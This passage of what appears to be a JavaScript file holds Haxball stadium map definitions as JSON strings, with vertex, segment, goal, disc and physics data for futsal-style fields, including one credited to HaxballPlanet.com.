240,"y": 256,"bCoef": 0.1,"cMask": ["red"],"cGroup": ["redKO","blueKO"]},{"x": 240,"y": 224,"bCoef": 0.1,"cMask": ["red"],"cGroup": ["redKO","blueKO"]},{"x": 0,"y": 269,"bCoef": 0.1,"cMask": ["red","blue"],"cGroup": ["redKO","blueKO"]},{"x": 0,"y": 241,"bCoef": 0.1,"cMask": ["red","blue"],"cGroup": ["redKO","blueKO"]},{"x": 0,"y": -241.00000190734863,"bCoef": 0.1,"cMask": ["red","blue"],"cGroup": ["redKO","blueKO"]},{"x": 0,"y": -269.00000190734863,"bCoef": 0.1,"cMask": ["red","blue"],"cGroup": ["redKO","blueKO"]},{"x": 553,"y": -81.00000190734863,"cMask": ["ball"]},{"x": -562,"y": 241,"cMask": ["ball"]},{"x": -562,"y": 81,"cMask": ["ball"]},{"x": -559,"y": 241,"cMask": ["ball"]},{"x": -559,"y": 81,"cMask": ["ball"]},{"x": -557,"y": 241,"cMask": ["ball"]},{"x": -557,"y": 81,"cMask": ["ball"]},{"x": -554,"y": 241,"cMask": ["ball"]},{"x": -554,"y": 81,"cMask": ["ball"]},{"x": -562,"y": -82.00000190734863,"cMask": ["ball"]},{"x": -562,"y": -242.00000190734863,"cMask": ["ball"]},{"x": -559,"y": -82.00000190734863,"cMask": ["ball"]},{"x": -559,"y": -242.00000190734863,"cMask": ["ball"]},{"x": -557,"y": -82.00000190734863,"cMask": ["ball"]},{"x": -557,"y": -242.00000190734863,"cMask": ["ball"]},{"x": -554,"y": -82.00000190734863,"cMask": ["ball"]},{"x": -554,"y": -242.00000190734863,"cMask": ["ball"]},{"x": 563,"y": -82,"cMask": ["ball"]},{"x": 563,"y": -242,"cMask": ["ball"]},{"x": 562.5,"y": -82,"cMask": ["ball"]},{"x": 562.5,"y": -242,"cMask": ["ball"]},{"x": 562,"y": -82,"cMask": ["ball"]},{"x": 562,"y": -242,"cMask": ["ball"]},{"x": 561.5,"y": -82,"cMask": ["ball"]},{"x": 561.5,"y": -242,"cMask": ["ball"]},{"x": 561,"y": -82,"cMask": ["ball"]},{"x": 561,"y": -242,"cMask": ["ball"]},{"x": 560.5,"y": -82,"cMask": ["ball"]},{"x": 560.5,"y": -242,"cMask": ["ball"]},{"x": 560,"y": -82,"cMask": ["ball"]},{"x": 560,"y": -242,"cMask": ["ball"]},{"x": 559.5,"y": -82,"cMask": ["ball"]},{"x": 559.5,"y": -242,"cMask": ["ball"]},{"x": 559,"y": -82,"cMask": ["ball"]},{"x": 559,"y": -242,"cMask": ["ball"]},{"x": 558.5,"y": -82,"cMask": ["ball"]},{"x": 558.5,"y": -242,"cMask": ["ball"]},{"x": 562,"y": 240,"cMask": ["ball"]},{"x": 562,"y": 80,"cMask": ["ball"]},{"x": 561.5,"y": 240,"cMask": ["ball"]},{"x": 561.5,"y": 80,"cMask": ["ball"]},{"x": 561,"y": 240,"cMask": ["ball"]},{"x": 561,"y": 80,"cMask": ["ball"]},{"x": 560.5,"y": 240,"cMask": ["ball"]},{"x": 560.5,"y": 80,"cMask": ["ball"]},{"x": 560,"y": 240,"cMask": ["ball"]},{"x": 560,"y": 80,"cMask": ["ball"]},{"x": 559.5,"y": 240,"cMask": ["ball"]},{"x": 559.5,"y": 80,"cMask": ["ball"]},{"x": 559,"y": 240,"cMask": ["ball"]},{"x": 559,"y": 80,"cMask": ["ball"]},{"x": 558.5,"y": 240,"cMask": ["ball"]},{"x": 558.5,"y": 80,"cMask": ["ball"]},{"x": 558,"y": 240,"cMask": ["ball"]},{"x": 558,"y": 80,"cMask": ["ball"]},{"x": 557.5,"y": 240,"cMask": ["ball"]},{"x": 557.5,"y": 80,"cMask": ["ball"]},{"x": -558,"y": 244,"cMask": ["ball"]},{"x": -558,"y": 84,"cMask": ["ball"]},{"x": -558.5,"y": 244,"cMask": ["ball"]},{"x": -558.5,"y": 84,"cMask": ["ball"]},{"x": -559,"y": 244,"cMask": ["ball"]},{"x": -559,"y": 84,"cMask": ["ball"]},{"x": -559.5,"y": 244,"cMask": ["ball"]},{"x": -559.5,"y": 84,"cMask": ["ball"]},{"x": -560,"y": 244,"cMask": ["ball"]},{"x": -560,"y": 84,"cMask": ["ball"]},{"x": -560.5,"y": 244,"cMask": ["ball"]},{"x": -560.5,"y": 84,"cMask": ["ball"]},{"x": -561,"y": 244,"cMask": ["ball"]},{"x": -561,"y": 84,"cMask": ["ball"]},{"x": -561.5,"y": 244,"cMask": ["ball"]},{"x": -561.5,"y": 84,"cMask": ["ball"]},{"x": -562,"y": 244,"cMask": ["ball"]},{"x": -562,"y": 84,"cMask": ["ball"]},{"x": -562.5,"y": 244,"cMask": ["ball"]},{"x": -562.5,"y": 84,"cMask": ["ball"]},{"x": -558,"y": -82,"cMask": ["ball"]},{"x": -558,"y": -242,"cMask": ["ball"]},{"x": -558.5,"y": -82,"cMask": ["ball"]},{"x": -558.5,"y": -242,"cMask": ["ball"]},{"x": -559,"y": -82,"cMask": ["ball"]},{"x": -559,"y": -242,"cMask": ["ball"]},{"x": -559.5,"y": -82,"cMask": ["ball"]},{"x": -559.5,"y": -242,"cMask": ["ball"]},{"x": -560,"y": -82,"cMask": ["ball"]},{"x": -560,"y": -242,"cMask": ["ball"]},{"x": -560.5,"y": -82,"cMask": ["ball"]},{"x": -560.5,"y": -242,"cMask": ["ball"]},{"x": -561,"y": -82,"cMask": ["ball"]},{"x": -561,"y": -242,"cMask": ["ball"]},{"x": -561.5,"y": -82,"cMask": ["ball"]},{"x": -561.5,"y": -242,"cMask": ["ball"]},{"x": -562,"y": -82,"cMask": ["ball"]},{"x": -562,"y": -242,"cMask": ["ball"]},{"x": -562.5,"y": -82,"cMask": ["ball"]},{"x": -562.5,"y": -242,"cMask": ["ball"]}],"segments": [{"v0": 0,"v1": 1,"vis": false,"cMask": ["ball"]},{"v0": 2,"v1": 3,"vis": false,"cMask": ["ball"]},{"v0": 4,"v1": 5,"vis": false,"cMask": ["ball"]},{"v0": 6,"v1": 7,"vis": false,"cMask": ["ball"]},{"v0": 12,"v1": 13,"bCoef": 0.1,"cMask": ["red","blue","ball"],"color": "FFFFFF"},{"v0": 13,"v1": 14,"bCoef": 0.1,"cMask": ["red","blue","ball"],"color": "FFFFFF"},{"v0": 14,"v1": 15,"bCoef": 0.1,"cMask": ["red","blue","ball"],"color": "FFFFFF"},{"v0": 16,"v1": 17,"bCoef": 0.1,"cMask": ["red","blue","ball"],"color": "FFFFFF"},{"v0": 17,"v1": 18,"bCoef": 0.1,"cMask": ["red","blue","ball"],"color": "FFFFFF"},{"v0": 18,"v1": 19,"bCoef": 0.1,"cMask": ["red","blue","ball"],"color": "FFFFFF"},{"v0": 8,"v1": 9,"bCoef": 0.1,"cMask": ["red","blue"],"cGroup": ["redKO","blueKO"],"color": "FFFFFF"},{"v0": 9,"v1": 10,"bCoef": 0.1,"curve": 180,"curveF": 6.123233995736766e-17,"cMask": ["red","blue"],"cGroup": ["blueKO"],"color": "FFFFFF"},{"v0": 10,"v1": 9,"bCoef": 0.1,"curve": 180,"curveF": 6.123233995736766e-17,"cMask": ["red","blue"],"cGroup": ["redKO"],"color": "FFFFFF"},{"v0": 10,"v1": 11,"bCoef": 0.1,"cMask": ["red","blue"],"cGroup": ["redKO","blueKO"],"color": "FFFFFF"},{"v0": 20,"v1": 21,"bCoef": 0.1,"cMask": ["ball"],"color": "FFFFFF"},{"v0": 22,"v1": 23,"bCoef": 0.1,"cMask": ["ball"],"color": "FFFFFF"},{"v0": 24,"v1": 25,"bCoef": 0.1,"cMask": ["ball"],"color": "FFFFFF"},{"v0": 26,"v1": 27,"bCoef": 0.1,"cMask": ["ball"],"color": "FFFFFF"},{"v0": 28,"v1": 29,"bCoef": 0.1,"cMask": ["ball"],"color": "FFFFFF"},{"v0": 30,"v1": 31,"bCoef": 0.1,"cMask": ["ball"],"color": "FFFFFF"},{"v0": 33,"v1": 32,"bCoef": 0.1,"curve": 89.99999999999997,"curveF": 1.0000000000000004,"cMask": ["blue"],"cGroup": ["blueKO"],"color": "FFFFFF"},{"v0": 34,"v1": 35,"bCoef": 0.1,"curve": 89.99999999999997,"curveF": 1.0000000000000004,"cMask": ["blue"],"cGroup": ["blueKO"],"color": "FFFFFF"},{"v0": 36,"v1": 37,"bCoef": 0.1,"cMask": ["blue"],"cGroup": ["blueKO"],"color": "FFFFFF"},{"v0": 38,"v1": 39,"bCoef": 0.1,"cMask": ["blue"],"color": "FFFFFF"},{"v0": 40,"v1": 41,"bCoef": 0.1,"curve": 89.38811856273134,"curveF": 1.0107367786405603,"cMask": ["red"],"cGroup": ["blueKO"],"color": "FFFFFF"},{"v0": 43,"v1": 42,"bCoef": 0.1,"curve": 89.99999999999997,"curveF": 1.0000000000000004,"cMask": ["red"],"cGroup": ["blueKO"],"color": "FFFFFF"},{"v0": 44,"v1": 45,"bCoef": 0.1,"cMask": ["red"],"cGroup": ["blueKO"],"color": "FFFFFF"},{"v0": 46,"v1": 47,"bCoef": 0.1,"cMask": ["red"],"color": "FFFFFF"},{"v0": 48,"v1": 49,"bCoef": 0.1,"curve": 89.99999999999997,"curveF": 1.0000000000000004,"cMask": ["blue"],"cGroup": ["blueKO"],"color": "FFFFFF"},{"v0": 50,"v1": 51,"bCoef": 0.1,"curve": 89.99999999999997,"curveF": 1.0000000000000004,"cMask": ["blue"],"cGroup": ["blueKO"],"color": "FFFFFF"},{"v0": 53,"v1": 52,"bCoef": 0.1,"curve": 89.99999999999997,"curveF": 1.0000000000000004,"cMask": ["red"],"cGroup": ["blueKO"],"color": "FFFFFF"},{"v0": 55,"v1": 54,"bCoef": 0.1,"curve": 89.99999999999997,"curveF": 1.0000000000000004,"cMask": ["red"],"cGroup": ["blueKO"],"color": "FFFFFF"},{"v0": 56,"v1": 57,"bCoef": 0.1,"curve": 180,"curveF": 6.123233995736766e-17,"cMask": ["blue"],"cGroup": ["redKO","blueKO"],"color": "FFFFFF"},{"v0": 59,"v1": 58,"bCoef": 0.1,"curve": 180,"curveF": 6.123233995736766e-17,"cMask": ["blue"],"cGroup": ["redKO","blueKO"],"color": "FFFFFF"},{"v0": 60,"v1": 61,"bCoef": 0.1,"curve": 180,"curveF": 6.123233995736766e-17,"cMask": ["blue"],"cGroup": ["redKO","blueKO"],"color": "FFFFFF"},{"v0": 63,"v1": 62,"bCoef": 0.1,"curve": 180,"curveF": 6.123233995736766e-17,"cMask": ["blue"],"cGroup": ["redKO","blueKO"],"color": "FFFFFF"},{"v0": 64,"v1": 65,"bCoef": 0.1,"curve": 180,"curveF": 6.123233995736766e-17,"cMask": ["blue"],"cGroup": ["redKO","blueKO"],"color": "FFFFFF"},{"v0": 67,"v1": 66,"bCoef": 0.1,"curve": 180,"curveF": 6.123233995736766e-17,"cMask": ["blue"],"cGroup": ["redKO","blueKO"],"color": "FFFFFF"},{"v0": 68,"v1": 69,"bCoef": 0.1,"curve": 180,"curveF": 6.123233995736766e-17,"cMask": ["blue"],"cGroup": ["redKO","blueKO"],"color": "FFFFFF"},{"v0": 71,"v1": 70,"bCoef": 0.1,"curve": 180,"curveF": 6.123233995736766e-17,"cMask": ["blue"],"cGroup": ["redKO","blueKO"],"color": "FFFFFF"},{"v0": 72,"v1": 73,"bCoef": 0.1,"curve": 180,"curveF": 6.123233995736766e-17,"cMask": ["blue"],"cGroup": ["redKO","blueKO"],"color": "FFFFFF"},{"v0": 75,"v1": 74,"bCoef": 0.1,"curve": 180,"curveF": 6.123233995736766e-17,"cMask": ["blue"],"cGroup": ["redKO","blueKO"],"color": "FFFFFF"},{"v0": 76,"v1": 77,"bCoef": 0.1,"curve": 180,"curveF": 6.123233995736766e-17,"cMask": ["blue"],"cGroup": ["redKO","blueKO"],"color": "FFFFFF"},{"v0": 79,"v1": 78,"bCoef": 0.1,"curve": 180,"curveF": 6.123233995736766e-17,"cMask": ["blue"],"cGroup": ["redKO","blueKO"],"color": "FFFFFF"},{"v0": 80,"v1": 81,"bCoef": 0.1,"curve": 180,"curveF": 6.123233995736766e-17,"cMask": ["blue"],"cGroup": ["redKO","blueKO"],"color": "FFFFFF"},{"v0": 83,"v1": 82,"bCoef": 0.1,"curve": 180,"curveF": 6.123233995736766e-17,"cMask": ["blue"],"cGroup": ["redKO","blueKO"],"color": "FFFFFF"},{"v0": 84,"v1": 85,"bCoef": 0.1,"curve": 180,"curveF": 6.123233995736766e-17,"cMask": ["blue"],"cGroup": ["redKO","blueKO"],"color": "FFFFFF"},{"v0": 87,"v1": 86,"bCoef": 0.1,"curve": 180,"curveF": 6.123233995736766e-17,"cMask": ["blue"],"cGroup": ["redKO","blueKO"],"color": "FFFFFF"},{"v0": 88,"v1": 89,"bCoef": 0.1,"curve": 180,"curveF": 6.123233995736766e-17,"cMask": ["red"],"cGroup": ["redKO","blueKO"],"color": "FFFFFF"},{"v0": 91,"v1": 90,"bCoef": 0.1,"curve": 180,"curveF": 6.123233995736766e-17,"cMask": ["red"],"cGroup": ["redKO","blueKO"],"color": "FFFFFF"},{"v0": 92,"v1": 93,"bCoef": 0.1,"curve": 180,"curveF": 6.123233995736766e-17,"cMask": ["red"],"cGroup": ["redKO","blueKO"],"color": "FFFFFF"},{"v0": 95,"v1": 94,"bCoef": 0.1,"curve": 180,"curveF": 6.123233995736766e-17,"cMask": ["red"],"cGroup": ["redKO","blueKO"],"color": "FFFFFF"},{"v0": 96,"v1": 97,"bCoef": 0.1,"curve": 180,"curveF": 6.123233995736766e-17,"cMask": ["red"],"cGroup": ["redKO","blueKO"],"color": "FFFFFF"},{"v0": 99,"v1": 98,"bCoef": 0.1,"curve": 180,"curveF": 6.123233995736766e-17,"cMask": ["red"],"cGroup": ["redKO","blueKO"],"color": "FFFFFF"},{"v0": 100,"v1": 101,"bCoef": 0.1,"curve": 180,"curveF": 6.123233995736766e-17,"cMask": ["red"],"cGroup": ["redKO","blueKO"],"color": "FFFFFF"},{"v0": 103,"v1": 102,"bCoef": 0.1,"curve": 180,"curveF": 6.123233995736766e-17,"cMask": ["red"],"cGroup": ["redKO","blueKO"],"color": "FFFFFF"},{"v0": 104,"v1": 105,"bCoef": 0.1,"curve": 180,"curveF": 6.123233995736766e-17,"cMask": ["red"],"cGroup": ["redKO","blueKO"],"color": "FFFFFF"},{"v0": 107,"v1": 106,"bCoef": 0.1,"curve": 180,"curveF": 6.123233995736766e-17,"cMask": ["red"],"cGroup": ["redKO","blueKO"],"color": "FFFFFF"},{"v0": 108,"v1": 109,"bCoef": 0.1,"curve": 180,"curveF": 6.123233995736766e-17,"cMask": ["red"],"cGroup": ["redKO","blueKO"],"color": "FFFFFF"},{"v0": 111,"v1": 110,"bCoef": 0.1,"curve": 180,"curveF": 6.123233995736766e-17,"cMask": ["red"],"cGroup": ["redKO","blueKO"],"color": "FFFFFF"},{"v0": 112,"v1": 113,"bCoef": 0.1,"curve": 180,"curveF": 6.123233995736766e-17,"cMask": ["red"],"cGroup": ["redKO","blueKO"],"color": "FFFFFF"},{"v0": 115,"v1": 114,"bCoef": 0.1,"curve": 180,"curveF": 6.123233995736766e-17,"cMask": ["red"],"cGroup": ["redKO","blueKO"],"color": "FFFFFF"},{"v0": 116,"v1": 117,"bCoef": 0.1,"curve": 180,"curveF": 6.123233995736766e-17,"cMask": ["red"],"cGroup": ["redKO","blueKO"],"color": "FFFFFF"},{"v0": 119,"v1": 118,"bCoef": 0.1,"curve": 180,"curveF": 6.123233995736766e-17,"cMask": ["red"],"cGroup": ["redKO","blueKO"],"color": "FFFFFF"},{"v0": 120,"v1": 121,"bCoef": 0.1,"cMask": ["red"],"cGroup": ["blueKO"],"color": "FFFFFF"},{"v0": 122,"v1": 123,"bCoef": 0.1,"cMask": ["blue"],"cGroup": ["blueKO"],"color": "FFFFFF"},{"v0": 124,"v1": 125,"bCoef": 0.1,"cMask": ["blue"],"cGroup": ["blueKO"],"color": "FFFFFF"},{"v0": 126,"v1": 127,"bCoef": 0.1,"cMask": ["red"],"cGroup": ["blueKO"],"color": "FFFFFF"},{"v0": 128,"v1": 129,"bCoef": 0.1,"cMask": ["red"],"cGroup": ["blueKO"],"color": "FFFFFF"},{"v0": 130,"v1": 131,"bCoef": 0.1,"cMask": ["blue"],"cGroup": ["blueKO"],"color": "FFFFFF"},{"v0": 132,"v1": 133,"bCoef": 0.1,"cMask": ["blue"],"cGroup": ["blueKO"],"color": "FFFFFF"},{"v0": 134,"v1": 135,"bCoef": 0.1,"cMask": ["blue"],"cGroup": ["blueKO"],"color": "FFFFFF"},{"v0": 136,"v1": 137,"bCoef": 0.1,"cMask": ["blue"],"cGroup": ["blueKO"],"color": "FFFFFF"},{"v0": 138,"v1": 139,"bCoef": 0.1,"cMask": ["blue"],"cGroup": ["blueKO"],"color": "FFFFFF"},{"v0": 140,"v1": 141,"bCoef": 0.1,"cMask": ["blue"],"cGroup": ["blueKO"],"color": "FFFFFF"},{"v0": 142,"v1": 143,"bCoef": 0.1,"cMask": ["red"],"cGroup": ["blueKO"],"color": "FFFFFF"},{"v0": 144,"v1": 145,"bCoef": 0.1,"cMask": ["red"],"cGroup": ["blueKO"],"color": "FFFFFF"},{"v0": 146,"v1": 147,"bCoef": 0.1,"vis": false,"cMask": ["red","blue"],"cGroup": ["redKO","blueKO"],"color": "FFFFFF"},{"v0": 148,"v1": 149,"bCoef": 0.1,"vis": false,"cMask": ["red","blue"],"cGroup": ["redKO","blueKO"],"color": "FFFFFF"},{"v0": 167,"v1": 168,"vis": false,"cMask": ["ball"]},{"v0": 169,"v1": 170,"vis": false,"cMask": ["ball"]},{"v0": 171,"v1": 172,"vis": false,"cMask": ["ball"]},{"v0": 173,"v1": 174,"vis": false,"cMask": ["ball"]},{"v0": 175,"v1": 176,"vis": false,"cMask": ["ball"]},{"v0": 177,"v1": 178,"vis": false,"cMask": ["ball"]},{"v0": 179,"v1": 180,"vis": false,"cMask": ["ball"]},{"v0": 181,"v1": 182,"vis": false,"cMask": ["ball"]},{"v0": 183,"v1": 184,"vis": false,"cMask": ["ball"]},{"v0": 185,"v1": 186,"vis": false,"cMask": ["ball"]},{"v0": 187,"v1": 188,"vis": false,"cMask": ["ball"]},{"v0": 189,"v1": 190,"vis": false,"cMask": ["ball"]},{"v0": 191,"v1": 192,"vis": false,"cMask": ["ball"]},{"v0": 193,"v1": 194,"vis": false,"cMask": ["ball"]},{"v0": 195,"v1": 196,"vis": false,"cMask": ["ball"]},{"v0": 197,"v1": 198,"vis": false,"cMask": ["ball"]},{"v0": 199,"v1": 200,"vis": false,"cMask": ["ball"]},{"v0": 201,"v1": 202,"vis": false,"cMask": ["ball"]},{"v0": 203,"v1": 204,"vis": false,"cMask": ["ball"]},{"v0": 205,"v1": 206,"vis": false,"cMask": ["ball"]},{"v0": 207,"v1": 208,"vis": false,"cMask": ["ball"]},{"v0": 209,"v1": 210,"vis": false,"cMask": ["ball"]},{"v0": 211,"v1": 212,"vis": false,"cMask": ["ball"]},{"v0": 213,"v1": 214,"vis": false,"cMask": ["ball"]},{"v0": 215,"v1": 216,"vis": false,"cMask": ["ball"]},{"v0": 217,"v1": 218,"vis": false,"cMask": ["ball"]},{"v0": 219,"v1": 220,"vis": false,"cMask": ["ball"]},{"v0": 221,"v1": 222,"vis": false,"cMask": ["ball"]},{"v0": 223,"v1": 224,"vis": false,"cMask": ["ball"]},{"v0": 225,"v1": 226,"vis": false,"cMask": ["ball"]},{"v0": 227,"v1": 228,"vis": false,"cMask": ["ball"]},{"v0": 229,"v1": 230,"vis": false,"cMask": ["ball"]},{"v0": 231,"v1": 232,"vis": false,"cMask": ["ball"]},{"v0": 233,"v1": 234,"vis": false,"cMask": ["ball"]},{"v0": 235,"v1": 236,"vis": false,"cMask": ["ball"]},{"v0": 237,"v1": 238,"vis": false,"cMask": ["ball"]},{"v0": 239,"v1": 240,"vis": false,"cMask": ["ball"]},{"v0": 241,"v1": 242,"vis": false,"cMask": ["ball"]},{"v0": 243,"v1": 244,"vis": false,"cMask": ["ball"]},{"v0": 245,"v1": 246,"vis": false,"cMask": ["ball"]}],"planes": [{"normal": [0,1],"dist": -240,"cMask": ["ball"]},{"normal": [0,-1],"dist": -240,"cMask": ["ball"]},{"normal": [0,1],"dist": -270,"bCoef": 0.1},{"normal": [0,-1],"dist": -270,"bCoef": 0.1},{"normal": [1,0],"dist": -620,"bCoef": 0.1},{"normal": [-1,0],"dist": -620,"bCoef": 0.1}],"goals": [{"p0": [-557,80],"p1": [-557,-80],"team": "red"},{"p0": [557,80],"p1": [557,-80],"team": "blue"}],"discs": [{"radius": 6.25,"bCoef": 0.4,"invMass": 1.5,"color": "FFCC00","cGroup": ["ball","kick","score"]},{"pos": [-550,80],"radius": 5,"invMass": 0,"color": "6666CC"},{"pos": [-550,-80],"radius": 5,"invMass": 0,"color": "6666CC"},{"pos": [550,80],"radius": 5,"invMass": 0,"color": "6666CC"},{"pos": [550,-80],"radius": 5,"invMass": 0,"color": "6666CC"},{"pos": [-550,-240],"radius": 3,"bCoef": 0.1,"invMass": 0,"color": "FFCC00","cMask": ["blue"],"cGroup": ["redKO","blueKO"]},{"pos": [-550,240],"radius": 3,"bCoef": 0.1,"invMass": 0,"color": "FFCC00","cMask": ["blue"],"cGroup": ["redKO","blueKO"]},{"pos": [550,240],"radius": 3,"bCoef": 0.1,"invMass": 0,"color": "FFCC00","cMask": ["red"],"cGroup": ["redKO","blueKO"]},{"pos": [550,-240],"radius": 3,"bCoef": 0.1,"invMass": 0,"color": "FFCC00","cMask": ["red"],"cGroup": ["redKO","blueKO"]}],"playerPhysics": {"bCoef": 0,"acceleration": 0.11,"kickingAcceleration": 0.083},"ballPhysics": "disc0","spawnDistance": 350}' ;
var bigMap = '{"name": "Futsal x4 ; By Bazinga! - HaxballPlanet.com","width": 800,"height": 350,"bg": {"type": "hockey","width": 700,"height": 320,"kickOffRadius": 80},"vertexes": [{"x": -700,"y": 321,"cMask": ["ball"]},{"x": -700,"y": -319,"cMask": ["ball"]},{"x": 699,"y": 319,"cMask": ["ball"]},{"x": 601,"y": -320,"cMask": ["ball"]},{"x": 0,"y": 350,"bCoef": 0.1,"cMask": ["red","blue"],"cGroup": ["redKO","blueKO"]},{"x": 0,"y": 80,"bCoef": 0.1,"cMask": ["red","blue"],"cGroup": ["redKO","blueKO"]},{"x": 0,"y": -80,"bCoef": 0.1,"cMask": ["red","blue"],"cGroup": ["redKO","blueKO"]},{"x": 0,"y": -350,"bCoef": 0.1,"cMask": ["red","blue"],"cGroup": ["redKO","blueKO"]},{"x": -700,"y": -99,"bCoef": 0.1,"cMask": ["ball"]},{"x": -750,"y": -99,"bCoef": 0.1,"cMask": ["ball"]},{"x": -750,"y": 90,"bCoef": 0.1,"cMask": ["ball"]},{"x": -700,"y": 90,"bCoef": 0.1,"cMask": ["ball"]},{"x": 700,"y": -90,"bCoef": 0.1,"cMask": ["ball"]},{"x": 749,"y": -90,"bCoef": 0.1,"cMask": ["ball"]},{"x": 749,"y": 90,"bCoef": 0.1,"cMask": ["ball"]},{"x": 699,"y": 90,"bCoef": 0.1,"cMask": ["ball"]},{"x": -700,"y": 90,"bCoef": 1.25,"cMask": ["ball"]},{"x": -700,"y": 321,"bCoef": 1.25,"cMask": ["ball"]},{"x": -700,"y": -99,"bCoef": 1.25,"cMask": ["ball"]},{"x": -700,"y": -319,"bCoef": 1.25,"cMask": ["ball"]},{"x": -700,"y": 321,"bCoef": 2,"cMask": ["ball"]},{"x": 699,"y": 319,"bCoef": 2,"cMask": ["ball"]},{"x": 699,"y": 90,"bCoef": 1.25,"cMask": ["ball"]},{"x": 699,"y": 319,"bCoef": 1.25,"cMask": ["ball"]},{"x": 699,"y": -321,"bCoef": 1.25,"cMask": ["ball"]},{"x": 699,"y": -90,"bCoef": 1.25,"cMask": ["ball"]},{"x": 601,"y": -320,"bCoef": 0,"cMask": ["ball"]},{"x": 601,"y": -320,"bCoef": 0,"cMask": ["ball"]},{"x": -699,"y": -320,"bCoef": 2,"cMask": ["ball"]},{"x": 699,"y": -321,"bCoef": 2,"cMask": ["ball"]},{"x": 0,"y": -320,"bCoef": 0.1,"cMask": ["red","blue"],"cGroup": ["redKO","blueKO"]},{"x": 0,"y": -80,"bCoef": 0.1,"cMask": ["red","blue"],"cGroup": ["redKO","blueKO"]},{"x": 0,"y": 80,"bCoef": 0.1,"cMask": ["red","blue"],"cGroup": ["redKO","blueKO"]},{"x": 0,"y": 320,"bCoef": 0.1,"cMask": ["red","blue"],"cGroup": ["redKO","blueKO"]},{"x": 0,"y": -80,"bCoef": 0.1,"cMask": ["red","blue"],"cGroup": ["redKO","blueKO"]},{"x": 0,"y": 80,"bCoef": 0.1,"cMask": ["red","blue"],"cGroup": ["redKO","blueKO"]},{"x": 0,"y": -150,"bCoef": 0.1,"cMask": ["red","blue"],"cGroup": ["redKO","blueKO"]},{"x": 0,"y": 90,"bCoef": 0.1,"cMask": ["red","blue"],"cGroup": ["redKO","blueKO"]},{"x": 0,"y": 80,"bCoef": 0.1,"cMask": ["red","blue"],"cGroup": ["redKO","blueKO"]},{"x": 0,"y": -80,"bCoef": 0.1,"cMask": ["red","blue"],"cGroup": ["redKO","blueKO"]},{"x": 0,"y": 80,"bCoef": 0.1,"cMask": ["red","blue"],"cGroup": ["redKO","blueKO"]},{"x": 0,"y": -80,"bCoef": 0.1,"cMask": ["red","blue"],"cGroup": ["redKO","blueKO"]},{"x": -710,"y": 90,"cMask": ["ball"]},{"x": -710,"y": 321,"cMask": ["ball"]},{"x": -710,"y": 90,"cMask": ["ball"]},{"x": -710,"y": 321,"cMask": ["ball"]},{"x": -710,"y": -315,"cMask": ["ball"]},{"x": -710,"y": -99,"cMask": ["ball"]},{"x": 710,"y": -90,"cMask": ["ball"]},{"x": 709,"y": -317,"cMask": ["ball"]},{"x": 709,"y": -90,"cMask": ["ball"]},{"x": 709,"y": 94,"cMask": ["ball"]},{"x": 709,"y": 319,"cMask": ["ball"]},{"x": -699,"y": 274,"bCoef": 0.1,"cMask": ["blue"],"cGroup": ["redKO","blueKO"]},{"x": -506,"y": 141,"bCoef": 0.1,"cMask": ["blue"],"cGroup": ["redKO","blueKO"]},{"x": -506,"y": 141,"bCoef": 0.1,"cMask": ["blue"],"cGroup": ["redKO","blueKO"]},{"x": -506,"y": -141,"bCoef": 0.1,"cMask": ["blue"],"cGroup": ["redKO","blueKO"]},{"x": -506,"y": -141,"bCoef": 0.1,"cMask": ["blue"],"cGroup": ["redKO","blueKO"]},{"x": -699,"y": -274,"bCoef": 0.1,"cMask": ["blue"],"cGroup": ["redKO","blueKO"]},{"x": 698,"y": 273,"bCoef": 0.1,"cMask": ["red"],"cGroup": ["redKO","blueKO"]},{"x": 505,"y": 140,"bCoef": 0.1,"cMask": ["red"],"cGroup": ["redKO","blueKO"]},{"x": 505,"y": 140,"bCoef": 0.1,"cMask": ["red"],"cGroup": ["redKO","blueKO"]},{"x": 505,"y": -142,"bCoef": 0.1,"cMask": ["red"],"cGroup": ["redKO","blueKO"]},{"x": 505,"y": -142,"bCoef": 0.1,"cMask": ["red"],"cGroup": ["redKO","blueKO"]},{"x": 698,"y": -275,"bCoef": 0.1,"cMask": ["red"],"cGroup": ["redKO","blueKO"]},{"x": -701,"y": 90,"bCoef": 0.1,"cMask": ["blue"],"cGroup": ["redKO","blueKO"]},{"x": -701,"y": -90,"bCoef": 0.1,"cMask": ["blue"],"cGroup": ["redKO","blueKO"]},{"x": 699,"y": 90,"bCoef": 0.1,"cMask": ["red"],"cGroup": ["redKO","blueKO"]},{"x": 699,"y": -90,"bCoef": 0.1,"cMask": ["red"],"cGroup": ["redKO","blueKO"]},{"x": -713,"y": 90,"cMask": ["ball"]},{"x": -713,"y": 321,"cMask": ["ball"]},{"x": -713,"y": -315,"cMask": ["ball"]},{"x": -713,"y": -99,"cMask": ["ball"]},{"x": 712,"y": -317,"cMask": ["ball"]},{"x": 712,"y": -90,"cMask": ["ball"]},{"x": 712,"y": 94,"cMask": ["ball"]},{"x": 712,"y": 319,"cMask": ["ball"]},{"x": 704,"y": -317,"cMask": ["ball"]},{"x": 704,"y": -90,"cMask": ["ball"]},{"x": 704,"y": -317,"cMask": ["ball"]},{"x": 704,"y": -90,"cMask": ["ball"]},{"x": 704,"y": 94,"cMask": ["ball"]},{"x": 704,"y": 319,"cMask": ["ball"]},{"x": 704,"y": 94,"cMask": ["ball"]},{"x": 704,"y": 319,"cMask": ["ball"]},{"x": -705,"y": 90,"cMask": ["ball"]},{"x": -705,"y": 321,"cMask": ["ball"]},{"x": -705,"y": 90,"cMask": ["ball"]},{"x": -705,"y": 321,"cMask": ["ball"]},{"x": -705,"y": -315,"cMask": ["ball"]},{"x": -705,"y": -99,"cMask": ["ball"]},{"x": -705,"y": -315,"cMask": ["ball"]},{"x": -705,"y": -99,"cMask": ["ball"]},{"x": -699,"y": 319.88890075683594,"bCoef": 2,"cMask": ["ball"]},{"x": 699,"y": 318.88890075683594,"bCoef": 2,"cMask": ["ball"]}],"segments": [{"v0": 8,"v1": 9,"bCoef": 0.1,"cMask": ["ball"],"color": "F8F8F8"},{"v0": 9,"v1": 10,"bCoef": 0.1,"cMask": ["ball"],"color": "F8F8F8"},{"v0": 10,"v1": 11,"bCoef": 0.1,"cMask": ["ball"],"color": "F8F8F8"},{"v0": 12,"v1": 13,"bCoef": 0.1,"cMask": ["ball"],"color": "F8F8F8"},{"v0": 13,"v1": 14,"bCoef": 0.1,"cMask": ["ball"],"color": "F8F8F8"},{"v0": 14,"v1": 15,"bCoef": 0.1,"cMask": ["ball"],"color": "F8F8F8"},{"v0": 4,"v1": 5,"bCoef": 0.1,"vis": false,"cMask": ["red","blue"],"cGroup": ["redKO","blueKO"]},{"v0": 5,"v1": 6,"bCoef": 0.1,"curve": 